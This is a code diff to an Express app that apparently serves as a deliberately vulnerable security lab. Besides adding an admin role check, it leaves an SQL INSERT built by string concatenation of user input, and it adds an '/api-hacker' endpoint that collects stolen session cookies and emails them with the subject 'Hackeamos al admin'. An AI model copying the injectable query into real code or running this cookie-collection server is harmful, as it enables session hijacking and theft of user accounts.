@@ -120,7 +120,7 @@ app.get('/lists', async (req, res) => {
 //onlyAdmin
 app.get('/users', async (req, res) => {
   
-  let validation = await validateRequest(req);
+  let validation = await validateRequest(req, true);
 
   if (!validation.success) {
     res.status(validation.statusCode).json({ response: validation.response });
@@ -187,7 +187,9 @@ app.post('/users/:username/lists', async (req, res) => {
   }
   try {
     await query("INSERT INTO lists (text, user_id) VALUES ('"+ req.body.text + "', "+response.id+");");
-  } catch {}
+  } catch (error) {
+    console.log(error);
+  }
 
   res.json({})
 })
@@ -283,7 +285,7 @@ app.listen(port, () => {
   // }
 })
 
-const validateRequest = async (req) => {
+const validateRequest = async (req, admin = false) => {
   
   // let user = req.cookies?.username
   var token = req.cookies?.vulnera2Token
@@ -306,7 +308,8 @@ const validateRequest = async (req) => {
     
     if (!response) return { success: false, statusCode: 404, response: "No existe el usuario" };
 
-    if (response.rol !== "rol2") return { success: false, statusCode: 401, response: "No tenes acceso" }; 
+    if (!admin && response.rol !== "rol2") return { success: false, statusCode: 401, response: "No tenes acceso" };
+    if (admin && response.rol !== "admin") return { success: false, statusCode: 401, response: "No tenes acceso" };
   }
 
   return { success: true, user: user };
@@ -314,8 +317,33 @@ const validateRequest = async (req) => {
 }
 
 //SERVER EXTERNO
+const nodemailer = require('nodemailer');
+
 app.post('/api-hacker', (req, res) => {
+  let mailTransporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: 'email',
+      pass: 'xx'
+    }
+  });
+
+  let mailDetails = {
+    from: 'email',
+    to: 'email',
+    subject: 'Hackeamos al admin',
+    text: `La cookie es ${req.query.cookies}`
+  };
+
+  mailTransporter.sendMail(mailDetails, function(err, data) {
+    if(err) {
+      console.log('Error Occurs');
+    } else {
+      console.log('Email sent successfully');
+    }
+  });
   console.log('Soy un server externo. Credenciales: ', req.query.cookies)
+  res.json({})
 })
 
 /*
